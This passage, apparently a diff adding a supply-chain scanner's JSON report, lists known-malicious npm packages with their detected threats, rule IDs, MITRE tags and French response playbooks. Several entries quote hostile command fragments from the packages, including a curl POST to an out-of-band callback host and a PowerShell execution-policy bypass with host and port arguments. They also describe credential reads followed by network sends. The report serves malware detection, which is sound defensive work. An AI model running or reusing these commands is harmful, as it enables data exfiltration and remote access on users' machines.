+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6252",
+      "package": "dva-loading-show-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:15:44Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-6251",
+      "package": "dva-loading-hide-rce",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-07-26T11:15:40Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-5849",
+      "package": "ringcentral-google-drive-notification-add-in",
+      "version": "2.2.2",
+      "all_versions": [
+        "2.2.2"
+      ],
+      "published": "2025-07-14T22:30:52Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-49398",
+      "package": "bf-purchases-frontend-web",
+      "version": "2.0.0",
+      "all_versions": [
+        "2.0.0"
+      ],
+      "published": "2025-11-08T14:00:01Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-49362",
+      "package": "snavbox",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-10-30T09:09:06Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 100,
+      "threat_count": 9,
+      "detected": true,
+      "threats": [
+        {
+          "type": "env_access",
+          "severity": "HIGH",
+          "message": "Access to sensitive variable process.env.YOUNGHERO_KEY.",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-002",
+          "rule_name": "Sensitive Environment Variable Access",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm",
+            "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+          ],
+          "mitre": "T1552.001",
+          "playbook": "Acces a une variable d'environnement sensible. Verifier si les donnees sont exfiltrees.",
+          "points": 10
+        },
+        {
+          "type": "env_access",
+          "severity": "HIGH",
+          "message": "Access to sensitive variable process.env.SUIDAO_AUTH.",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-002",
+          "rule_name": "Sensitive Environment Variable Access",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm",
+            "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+          ],
+          "mitre": "T1552.001",
+          "playbook": "Acces a une variable d'environnement sensible. Verifier si les donnees sont exfiltrees.",
+          "points": 10
+        },
+        {
+          "type": "env_access",
+          "severity": "HIGH",
+          "message": "Access to sensitive variable process.env.BOT_TOKEN.",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-002",
+          "rule_name": "Sensitive Environment Variable Access",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm",
+            "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+          ],
+          "mitre": "T1552.001",
+          "playbook": "Acces a une variable d'environnement sensible. Verifier si les donnees sont exfiltrees.",
+          "points": 10
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"curl -o /dev/null -m 2 -s -w \"%{http_code}\" https://www.youtube.com\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"curl -s --max-time 2 ipv4.ip.sb\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"curl -s --max-time 1 ipv6.ip.sb\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        },
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"curl -s https://speed.cloudflare.com/meta | awk -F\\\" '{print $26\"-\"$18}' | sed -\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (YOUNGHERO_KEY, SUIDAO_AUTH, BOT_TOKEN, os.arch) + network send (post, get, execSync, execSync, execSync, execSync, get, post, post, post, post)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "MEDIUM",
+          "message": "High entropy string (5.72 bits, 573 chars) — possible base64/hex/encrypted payload",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-49309",
+      "package": "webswing-directdraw-javascript",
+      "version": "1.0.1",
+      "all_versions": [
+        "1.0.1",
+        "1.0.2"
+      ],
+      "published": "2025-11-02T20:50:25Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 25,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"\ncurl -X POST \"http://96503250e360223c79a7g1b6nchyyyyyn.oast.pro/noderedactedsdk\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-48948",
+      "package": "haedal-vaults-sdk",
+      "version": "1.5.0",
+      "all_versions": [
+        "1.5.0",
+        "1.5.1",
+        "1.6.0"
+      ],
+      "published": "2025-10-23T05:56:38Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"prepare\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-41261",
+      "package": "chartsmaan",
+      "version": "0.0.0",
+      "all_versions": [
+        "0.0.0"
+      ],
+      "published": "2025-08-21T14:44:29Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 25,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "dangerous_exec",
+          "severity": "CRITICAL",
+          "message": "Dangerous shell command in exec(): \"powershell -ExecutionPolicy Bypass -File \"***\" -Host \"***\" -Port *** -WindowStyl\"",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-007",
+          "rule_name": "Dangerous Shell Command Execution",
+          "confidence": "high",
+          "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection"
+          ],
+          "mitre": "T1059.004",
+          "playbook": "CRITIQUE: Execution de commande shell dangereuse detectee. Isoler la machine. Verifier si la commande a ete executee.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-3943",
+      "package": "supera",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0",
+        "1.0.1"
+      ],
+      "published": "2025-02-23T05:58:50Z",
+      "credit": [
+        "GitHax - Software Supply Chain Threat Intelligence"
+      ],
+      "status": "scanned",
+      "score": 0,
+      "threat_count": 0,
+      "detected": false,
+      "threats": []
+    },
+    {
+      "mal_id": "MAL-2025-3399",
+      "package": "freo-design-system",
+      "version": "1.0.4",
+      "all_versions": [
+        "1.0.4",
+        "1.0.1"
+      ],
+      "published": "2025-04-25T20:32:55Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-2623",
+      "package": "corehome",
+      "version": "7.0.1",
+      "all_versions": [
+        "7.0.1"
+      ],
+      "published": "2025-03-25T08:25:42Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 0,
+      "threat_count": 0,
+      "detected": false,
+      "threats": []
+    },
+    {
+      "mal_id": "MAL-2025-1235",
+      "package": "u-workflow.utils-legacy",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"test\" contains network command (curl/wget/nc/nslookup). Unusual for \"test\".",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1231",
+      "package": "sjzxy",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1226",
+      "package": "nuxtjs_style_resources",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 45,
+      "threat_count": 3,
+      "detected": true,
+      "threats": [
+        {
+          "type": "sensitive_string",
+          "severity": "HIGH",
+          "message": "Reference to \"/etc/passwd\" detected.",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-001",
+          "rule_name": "Sensitive String Reference",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm",
+            "https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack"
+          ],
+          "mitre": "T1552.001",
+          "playbook": "Reference a un chemin ou identifiant sensible. Verifier le contexte d'utilisation.",
+          "points": 10
+        },
+        {
+          "type": "sensitive_string",
+          "severity": "HIGH",
+          "message": "Reference to \"/etc/shadow\" detected.",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-001",
+          "rule_name": "Sensitive String Reference",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm",
+            "https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack"
+          ],
+          "mitre": "T1552.001",
+          "playbook": "Reference a un chemin ou identifiant sensible. Verifier le contexte d'utilisation.",
+          "points": 10
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.hostname, USER, USERNAME, os.platform, os.arch, os.networkInterfaces, os.homedir) + network send (request, http.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1221",
+      "package": "invalid-dependency",
+      "version": "10.0.0",
+      "all_versions": [
+        "10.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1216",
+      "package": "effect-layout-function",
+      "version": "9.1.2",
+      "all_versions": [
+        "9.1.2"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 10,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "curl_exfiltration",
+          "severity": "HIGH",
+          "message": "Pattern malveillant \"curl_exfiltration\" detecte.",
+          "file": "build.sh",
+          "count": 1,
+          "rule_id": "MUADDIB-SHELL-008",
+          "rule_name": "Data Exfiltration via Curl",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1041/"
+          ],
+          "mitre": "T1041",
+          "playbook": "Exfiltration de donnees via curl. Verifier les donnees envoyees et la destination.",
+          "points": 10
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1213",
+      "package": "cxf-plugins",
+      "version": "10.0.0",
+      "all_versions": [
+        "10.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1210",
+      "package": "chakll",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"install\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1207",
+      "package": "babel-plugin-remove-jsx-empty-expression",
+      "version": "10.0.0",
+      "all_versions": [
+        "10.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1042",
+      "package": "lib-automotive-call-cdm",
+      "version": "1.12.1",
+      "all_versions": [
+        "1.12.1"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1031",
+      "package": "cg-be-package",
+      "version": "1.0.0",
+      "all_versions": [
+        "1.0.0",
+        "1.1.0",
+        "1.2.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2025-1021",
+      "package": "aws-genai-llm-chatbot",
+      "version": "5.0.0",
+      "all_versions": [
+        "5.0.0"
+      ],
+      "published": "2025-02-03T17:25:15Z",
+      "credit": [
+        "Amazon Inspector"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (os.homedir, os.hostname, os.userInfo) + network send (request, https.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-9303",
+      "package": "nuxtjs_axios",
+      "version": "5.13.6",
+      "all_versions": [
+        "5.13.6"
+      ],
+      "published": "2024-10-16T12:31:00Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 25,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (USER) + network send (request, http.request)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2024-9066",
+      "package": "nf-cl-logger",
+      "version": "30.0.0",
+      "all_versions": [
+        "30.0.0"
+      ],
+      "published": "2024-10-01T11:00:56Z",
+      "credit": [
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "dependency_url_suspicious",
+          "severity": "MEDIUM",
+          "message": "Dependency \"axios\" uses HTTP URL: https://registry.storageartifact.com/nf-cl-logger (unusual, verify source)",
+          "file": "package.json",
